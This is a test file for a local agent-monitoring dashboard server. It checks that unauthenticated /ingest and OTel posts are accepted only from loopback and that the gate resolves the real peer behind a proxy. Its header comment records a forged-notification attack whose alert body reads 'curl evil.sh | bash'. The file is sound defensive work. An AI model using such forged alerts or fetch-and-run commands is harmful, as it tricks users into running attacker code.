/*
 * The append-only sinks, against a server with the token gate live.
 *
 * `/ingest` is exempt from the token so a local hook — which has no way to
 * carry a secret — can report. The exemption was written when this server only
 * ever listened on 127.0.0.1, and it justified itself with "they can only
 * *append* events". Appending stopped being inert the day it drove a
 * notification: /ingest → maybeAlert → sink.broadcast → the desk and the paired
 * phone, with the title and body taken from the request, outside the
 * sessionInScope filter that contains everything else.
 *
 * Measured on a server bound 0.0.0.0, from a LAN address, with no credential:
 *
 *   POST /sessions            → 401 {"ok":false,"error":"unauthorized …"}
 *   POST /ingest {source_app:"Security", hook_event_type:"Notification",
 *                 payload:{message:"Your disk is failing — run: curl evil.sh | bash"}}
 *                             → 200 {"ok":true,"id":1}
 *   and on the desk's socket  → {"type":"alert","data":{"title":"🔔 Security:forged-b",
 *                                "body":"Your disk is failing — run: curl evil.sh | bash","urgency":1}}
 *
 * followed by a forged `⏳ Approval needed` at urgency 2 — the shape that means
 * "an agent is stopped, come and approve it" — and three permanent rows in
 * SQLite, one carrying $9,999 of cost.
 *
 * What is checked here is the half a test on this machine can reach: that a
 * hook on loopback still gets in with nothing at all, which is the regression
 * that would break every user's dashboard. The other half — that the same post
 * from off-box is refused — is pinned in security.test.ts over the rule itself,
 * because reproducing it needs a second, non-loopback address on the host and
 * CI has no such thing. The two are joined by the last test in this file, which
 * checks that the gate actually asks the rule the address question.
 */
import { afterAll, beforeAll, expect, test } from "bun:test";
import { mkdtempSync, rmSync, readFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { TMUX_TEST_TMPDIR } from "./tmuxTmp.ts";

const TOKEN = "test-machine-token-not-a-real-one";
let dir: string, base: string, proc: ReturnType<typeof Bun.spawn> | null = null;

beforeAll(async () => {
  dir = mkdtempSync(join(tmpdir(), "agx-ingest-origin-"));
  const port = 4960 + Math.floor(Math.random() * 30);
  base = `http://127.0.0.1:${port}`;
  proc = Bun.spawn(["bun", "run", new URL("../src/index.ts", import.meta.url).pathname], {
    // A named environment, never `...process.env`: `bun test` shares one process
    // across files, so the parent's environment is whatever every suite before
    // this one happened to leave on it.
    env: {
      PATH: process.env.PATH ?? "",
      // The server sweeps tmux window sizes at boot; without this it sweeps the
      // developer's own socket directory. See tmuxTmp.ts.
      TMUX_TMPDIR: TMUX_TEST_TMPDIR,
      HOME: process.env.HOME ?? "",
      XDG_CONFIG_HOME: dir,
      AGENTGLASS_ROOT: dir,
      AGENTGLASS_DB: join(dir, "f.db"),
      AGENTGLASS_SCAN_DISABLED: "1",
      AGENTGLASS_PORT: String(port),
      // The whole point: without this the gate is skipped entirely and every
      // request below passes for the wrong reason.
      AGENTGLASS_TOKEN: TOKEN,
    },
    stdout: "ignore", stderr: "pipe",
  });
  for (let i = 0; i < 100; i++) {
    try {
      if ((await fetch(base + "/health")).ok) return;
    } catch { /* not up yet */ }
    await Bun.sleep(100);
  }
  throw new Error("server did not start");
});

afterAll(() => {
  proc?.kill();
  rmSync(dir, { recursive: true, force: true });
});

const post = (path: string, body: unknown, headers: Record<string, string> = {}) =>
  fetch(base + path, {
    method: "POST",
    headers: { "content-type": "application/json", ...headers },
    body: JSON.stringify(body),
  });

test("a local hook still reports with no credential at all", async () => {
  const r = await post("/ingest", {
    source_app: "a-local-hook",
    session_id: "local-hook-session",
    hook_event_type: "PreToolUse",
    payload: {},
  });
  expect(r.status).toBe(200);
  expect(await r.json()).toMatchObject({ ok: true });
});

test("and so do the local OTel exporters", async () => {
  // An exporter cannot be told to add a header by the CLI that owns it, which
  // is the whole reason these are exempt in the first place.
  for (const p of ["/v1/traces", "/otlp/v1/traces", "/v1/logs", "/otlp/v1/logs"]) {
    const r = await post(p, { resourceSpans: [] });
    expect(r.status, p).toBe(200);
  }
});

test("while a credentialled route from the same place is still 401", async () => {
  // The control: if this passed, the test above would prove nothing.
  const r = await post("/sessions", {});
  expect(r.status).toBe(401);
});

test("an off-box sender that carries the token gets in", async () => {
  // The way out for someone genuinely running the server on another machine:
  // the same `Authorization: Bearer $AGENTGLASS_TOKEN` gate_event.py sends, and
  // which send_event.py now sends too.
  const r = await post("/ingest", {
    source_app: "off-box",
    session_id: "off-box-session",
    hook_event_type: "PreToolUse",
    payload: {},
  }, { authorization: `Bearer ${TOKEN}` });
  expect(r.status).toBe(200);
});

test("the gate asks WHERE a request came from, not only which path it is", () => {
  // This used to say the refusal "cannot be exercised from here: proving it
  // needs a second, non-loopback address on the host, which CI does not have",
  // and pinned `isLoopback(clientIp)` in the source instead. That reasoning had
  // a hole in it the size of the tailnet: a reverse proxy needs no address of
  // its own, only the ability to say who it speaks for — which is exactly how
  // `tailscale serve` made every phone on the tailnet look like loopback and
  // walked them straight through this gate. serve-proxy.test.ts now drives the
  // refusal for real, against a real server, through a proxy that behaves the
  // way tailscaled was measured to behave.
  //
  // What is still worth pinning here is the shape of the one call site: the
  // origin must be *computed from this request* and not be a constant, a
  // startup-time property of the bind, or the raw socket address. resolvePeer
  // is what makes it the real peer; originOf is what refuses to call a proxied
  // request local. Losing either is the bug coming back.
  const src = readFileSync(new URL("../src/index.ts", import.meta.url), "utf8");
  const call = /isAuthExempt\(pathname,\s*(\w+)\)/.exec(src);
  expect(call, "index.ts no longer gates on isAuthExempt(pathname, from)").not.toBeNull();
  const decl = new RegExp(`const\\s+${call![1]}\\s*:\\s*Origin\\s*=\\s*([^;]+);`).exec(src);
  expect(decl, `${call![1]} is not declared as an Origin in index.ts`).not.toBeNull();
  expect(decl![1], "the origin the gate uses is not derived from this request's peer").toContain("originOf(peer)");
  expect(src, "index.ts no longer resolves the peer behind a proxy").toContain("resolvePeer({");
  expect(src, "index.ts trusts a forwarding header without verifying the proxy").toContain("proxiedByTailscaled(");
});
